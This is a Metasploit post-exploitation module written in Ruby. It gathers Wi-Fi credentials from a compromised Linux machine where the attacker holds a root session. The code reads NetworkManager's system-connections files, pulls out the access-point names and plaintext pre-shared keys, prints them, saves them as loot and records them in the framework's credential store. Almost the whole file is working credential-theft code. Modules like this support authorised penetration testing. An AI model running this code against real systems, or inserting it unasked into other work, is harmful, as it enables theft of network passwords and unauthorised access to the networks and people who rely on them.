##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System

  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Linux Gather 802-11-Wireless-Security Credentials',
      'Description'   => %q{
          This module collects 802-11-Wireless-Security credentials such as
          Access-Point name and Pre-Shared-Key from your target CLIENT Linux
          machine using /etc/NetworkManager/system-connections/ files.
          The module gathers NetworkManager's plaintext "psk" information.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['Cenk Kalpakoglu'],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell', 'meterpreter']
    ))

    register_options(
      [
        OptString.new('DIR', [true, 'The default path for network connections',
                              '/etc/NetworkManager/system-connections/']
        )
      ])
  end

  def dir
    datastore['DIR']
  end

  # Extracts AccessPoint name and PSK
  def get_psk(data, ap_name)
    data.each_line do |l|
      if l =~ /^psk=/
        psk = l.split('=')[1].strip
        return [ap_name, psk]
      end
    end
    nil
  end

  def extract_all_creds
    tbl = Rex::Text::Table.new({
      'Header'  => '802-11-wireless-security',
      'Columns' => ['AccessPoint-Name', 'PSK'],
      'Indent'  => 1,
    })
    files = cmd_exec("/bin/ls -1 #{dir}").chomp.split("\n")
    files.each do |f|
      file = "#{dir}#{f}"
      # TODO: find better (ruby) way
      if data = read_file(file)
        print_status("Reading file #{file}")
        ret = get_psk(data, f)
        if ret
          tbl << ret
        end
      end
    end
    tbl
  end

  def run
    if is_root?
      tbl = extract_all_creds
      if tbl.rows.empty?
        print_status('No PSK has been found!')
      else
        print_line("\n" + tbl.to_s)
        p = store_loot(
          'linux.psk.creds',
          'text/csv',
          session,
          tbl.to_csv,
          File.basename('wireless_credentials.txt')
        )

        print_good("Secrets stored in: #{p}")

        tbl.rows.each do |cred|
          user = cred[0] # AP name
          password = cred[1]
          create_credential(
            workspace_id: myworkspace_id,
            origin_type: :session,
            address: session.session_host,
            session_id: session_db_id,
            post_reference_name: self.refname,
            username: user,
            private_data: password,
            private_type: :password,
          )
        end
        print_status("Done")
      end
    else
      print_error('You must run this module as root!')
    end
  end
end
